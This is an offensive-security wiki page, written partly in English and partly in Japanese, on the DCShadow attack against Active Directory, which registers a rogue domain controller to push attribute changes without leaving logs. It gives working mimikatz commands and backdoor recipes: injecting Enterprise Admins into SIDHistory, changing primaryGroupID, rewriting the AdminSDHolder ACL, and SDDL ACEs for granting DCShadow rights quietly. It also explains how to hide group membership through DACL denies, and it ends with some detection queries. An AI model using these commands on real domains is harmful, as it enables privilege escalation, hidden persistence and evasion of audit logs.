# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

AD に **new Domain Controller** を登録し、それを使って指定オブジェクトに対して (SIDHistory, SPNs...) の属性を **push attributes** し、**without** leaving any **logs** regarding the **modifications**。この攻撃を実行するには **need DA** privileges が必要で、**root domain** 内にいる必要があります。\
誤ったデータを使用すると、かなり醜い logs が出力されるので注意してください。

To perform the attack you need 2 mimikatz instances. One of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform), and the other instance will be used to push the values:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Notice that **`elevate::token`** won't work in `mimikatz1` session as that elevated the privileges of the thread, but we need to elevate the **privilege of the process**.\
注意：**`elevate::token`**は`mimikatz1`セッションでは機能しません。これはスレッドの特権を昇格させるだけで、プロセスの特権を昇格させる必要があります。\
You can also select and "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`\
また "LDAP" オブジェクトを選択できます: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

You can push the changes from a DA or from a user with this minimal permissions:\
変更は DA または以下の最小権限を持つユーザーからプッシュできます:

- In the **domain object**:
- _DS-Install-Replica_ (Add/Remove Replica in Domain)
- _DS-Replication-Manage-Topology_ (Manage Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchornization)
- The **Sites object** (and its children) in the **Configuration container**:
- _CreateChild and DeleteChild_
- The object of the **computer which is registered as a DC**:
- _WriteProperty_ (Not Write)
- The **target object**:
- _WriteProperty_ (Not Write)

- **domain object** 内:
- _DS-Install-Replica_（ドメイン内でのレプリカの追加/削除）
- _DS-Replication-Manage-Topology_（レプリケーショントポロジの管理）
- _DS-Replication-Synchronize_（レプリケーションの同期）
- **Configuration container** 内の **Sites object**（およびその子オブジェクト）:
- _CreateChild and DeleteChild_
- **DCとして登録されているコンピュータ** のオブジェクト:
- _WriteProperty_（Writeではない）
- **ターゲットオブジェクト**:
- _WriteProperty_（Writeではない）

You can use [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having DA privileges.\
これらの権限を特権のないユーザーに付与するには [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) を使用できます（これによりいくつかのログが残ることに注意してください）。これは DA 権限を持つことよりもはるかに制限的です。\
For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` This means that the username _**student1**_ when logged on in the machine _**mcorp-student1**_ has DCShadow permissions over the object _**root1user**_.\
例えば: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` これは、ユーザー名 _**student1**_ がマシン _**mcorp-student1**_ にログオンしている場合、そのユーザーがオブジェクト _**root1user**_ に対して DCShadow 権限を持つことを意味します。

## Using DCShadow to create backdoors
## DCShadow を使ってバックドアを作成する
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### 主要グループの悪用、列挙ギャップ、および検出

- `primaryGroupID` はグループの `member` リストとは別個の属性です。DCShadow/DSInternals はそれを直接書き換え可能です（例: `primaryGroupID=512` を **Domain Admins** に設定）—オンボックスの LSASS による強制なしで—しかし AD はユーザーを**移動**します: PGID を変更すると常に以前のプライマリグループからのメンバーシップを取り除く（任意のターゲットグループでも同様の動作）ため、古いプライマリグループのメンバーシップを維持することはできません。
- 既定ツールはユーザーを現在のプライマリグループから削除することを防ぎます（`ADUC`, `Remove-ADGroupMember`）、そのため PGID の変更は通常ディレクトリへの直接書き込みを必要とします（DCShadow/`Set-ADDBPrimaryGroup`）。
- メンバーシップ報告は一貫していません:
- **含まれる** プライマリグループ由来メンバー: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **除外される** プライマリグループ由来メンバー: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit での `member` の確認、`Get-ADUser <user> -Properties memberOf`.
- 再帰チェックは、**プライマリグループ自体がネストされている** 場合にプライマリグループのメンバーを見逃すことがあります（例: ユーザーの PGID が Domain Admins 内のネストされたグループを指す場合）。`Get-ADGroupMember -Recursive` や LDAP の再帰フィルタは、再帰がプライマリグループを明示的に解決しない限りそのユーザーを返しません。
- DACL トリック: 攻撃者はユーザー上の `primaryGroupID` に対して **ReadProperty を拒否** する（または非 AdminSDHolder グループについてはグループの `member` 属性に対して）ことで、大多数の PowerShell クエリから実際のメンバーシップを隠すことができます；`net group` はそれでもメンバーシップを解決します。AdminSDHolder 保護されたグループはそのような拒否をリセットします。

検出/監視の例:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Get-ADGroupMember の出力を `Get-ADGroup -Properties member` または ADSI Edit と比較して、`primaryGroupID` や隠し属性によって生じた不一致を確認してください。

## Shadowception - DCShadow を使って DCShadow に権限を付与する（権限変更ログを修正しない）

以下の ACE をユーザーの SID を末尾に付けて追加する必要があります:

- ドメインオブジェクト上:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- 攻撃者のコンピュータオブジェクト上: `(A;;WP;;;UserSID)`
- ターゲットユーザーオブジェクト上: `(A;;WP;;;UserSID)`
- Configuration コンテナ内の Sites オブジェクト上: `(A;CI;CCDC;;;UserSID)`

オブジェクトの現在の ACE を取得するには: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

この場合、1つだけでなく**複数の変更**を行う必要がある点に注意してください。したがって、**mimikatz1 session** (RPC server) では、実行したい各変更に対してパラメータ **`/stack`** を使用してください。こうすることで、rouge サーバー上の保留中の変更をすべて適用するために、1 回だけ **`/push`** すれば済みます。

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## References

- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
